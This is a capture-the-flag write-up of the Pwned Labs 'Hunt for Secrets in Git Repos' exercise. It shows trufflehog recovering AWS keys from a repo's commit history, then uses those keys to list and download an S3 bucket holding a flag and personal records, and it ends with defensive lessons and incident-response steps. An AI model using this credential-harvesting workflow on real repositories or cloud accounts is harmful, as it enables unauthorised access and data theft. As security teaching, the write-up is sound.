---
title: "Pwned Labs - Hunt for Secrets in Git Repos"
date: 2024-02-16
categories: [AWS, Cloud, Security]
tags: [AWS, Security, git, secrets, PwnedLabs]
---

![Intro](/images/PwnedLabs/Secrets_in_git/1.png)

Hola Amigo! kaise ho theek ho? This time we will be solving [Hunt for Secrets in Git Repos](https://pwnedlabs.io/labs/hunt-for-secrets-in-git-repos) challenge.\
There have been many [data breaches](https://www.breaches.cloud/tags/github/) because of leaked credentials in Git repos. In this challenge we will be finding secrets such as AWS Credentials in one of the github repositories and use them for further exploitation.

In this challenge we are provided with a github repository. Firstly, we will clone this repository into our system.

```
git clone https://github.com/huge-logistics/cargo-logistics-dev
```

[Trufflehog](https://github.com/trufflesecurity/trufflehog) is a very popular tool for finding secrets in git repositories. You can install it with `pip install trufflehog`.

When we run trufflehog against the repository provided, we can notice AWS Credentials found. We can assume that the devloper commited AWS Credentials in the repository and later removed them in the commit `Delete log-s3-test directory`. But, since it is a git repo, we can find the deleted items in the commit history. 

```
❯ trufflehog  --regex --entropy=False .\cargo-logistics-dev\
~~~~~~~~~~~~~~~~~~~~~
Reason: AWS API Key
Date: 2023-07-05 22:16:16
Hash: ea1a7618508b8b0d4c7362b4044f1c8419a07d99
Filepath: log-s3-test/log-upload.php
Branch: origin/main
Commit: Delete log-s3-test directory
AKIAWHEOTHRFSGQITLIY
~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~
Reason: Generic Secret
Date: 2023-07-05 22:16:16
Hash: ea1a7618508b8b0d4c7362b4044f1c8419a07d99
Filepath: log-s3-test/log-upload.php
Branch: origin/main
Commit: Delete log-s3-test directory
secret' => "IqHCweAXZOi8WJlQrhuQulSuGnUO51HFgy7ZShoB"
~~~~~~~~~~~~~~~~~~~~~
```
If we run the git diff command, we can view the changes between the two commits. We can clearly observe here that the AWS Credentials, bucket name and other data was deleted from the `log-upload.php` file.

```
❯ git diff 9815edaef0626c905952046f7ca70315069c0e39 ea1a7618508b8b0d4c7362b4044f1c8419a07d99
```
![Intro](/images/PwnedLabs/Secrets_in_git/2.png)

Now the next step is to export those keys into our environment and use them to further enumerate and exploit. We can use `aws configure` to import access key and secret key in our environment. 

After that, we try to list the contents in the S3 bucket `huge-logistics-transact` we found in the github repository. We can notice that this bucket contains `flag.txt` and a `web_transactions.csv` file which contains sensitive data. 

```
❯ aws s3 ls huge-logistics-transact --profile git
2023-07-05 21:23:50         32 flag.txt
2023-07-04 22:45:47          5 transact.log
2023-07-05 21:27:36      51968 web_transactions.csv

❯ aws s3 cp s3://huge-logistics-transact/flag.txt - --profile git
fe108d6a1a0937b0a7620947a678aabf

❯ aws s3 cp s3://huge-logistics-transact/web_transactions.csv - --profile git
id,username,email,ip_address
1,aemblen0,csautter0@soup.io,196.54.202.51
2,jpiff1,rgovett1@cafepress.com,59.222.23.53
3,aharbour2,bgilfether2@seattletimes.com,178.60.232.230
4,clomis3,rhardwich3@alibaba.com,165.58.39.76
5,cmalthus4,morrobin4@omniture.com,164.101.115.130
6,rnussii5,bembury5@reference.com,235.243.126.82
7,tstquintin6,ddelmage6@japanpost.jp,106.79.209.13
8,areuben7,mbeadham7@csmonitor.com,254.118.21.81
9,kbegley8,jbuff8@nytimes.com,4.163.136.96
10,hellerington9,sferreli9@naver.com,127.116.67.79
```

## Lessons learned
- Never hardcode sensitive data such as AWS Credentials in source code.
- Never commit sensitive data such as passwords, AWS Credentials in your public repositories.
- Implement proper SAST and Secret scanning tools in your CI/CD pipeline and your systems which scan and alerts you before you commit such sensitive data.

    ![Intro](/images/PwnedLabs/Secrets_in_git/4.png)

- If sensitive data such as Passwords, AWS Credentials are exposed in github repositories or any public source, deleting them from your git is not a proper solution as we observed that one can find such sensitive data in commit history, what's recommended is to disable/delete those keys and create new keys for your work which are stored in a secure location.
- You can also tools like [git secrets](https://github.com/awslabs/git-secrets) from AWS to scan for secrets in git repositories. 
- Incident Response tip : In a scenario where you found out that a set of AWS Credentials are leaked, follow the below steps:
    1. Disable the Access key and DO NOT delete them as they might be used in your environment for critical tasks.
    2. Apply a `deny all` policy on the resource the keys belong to. 
    3. Revoke any active sessions as there might be a possibility that the attacker acquired temporary credentials via `sts:GetFederationToken`.
    4. Now investivate further for all the activities performed by the leaked set of credentials with Cloudtrail and other services.
    5. Once everything is done, and you are confirmed that the attacker is not in your account anymore, rotate the credentials.
- Rotate the credentials on a specific time period.
- AWS sends you an email if it founds AWS Credentials exposed in your public repositories and, AWS also applies a [AWSCompromisedKeyQuarantineV2](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AWSCompromisedKeyQuarantineV2.html) policy on the principle those credentials belongs to, to block some malicious activities.
  ![Intro](/images/PwnedLabs/Secrets_in_git/3.png)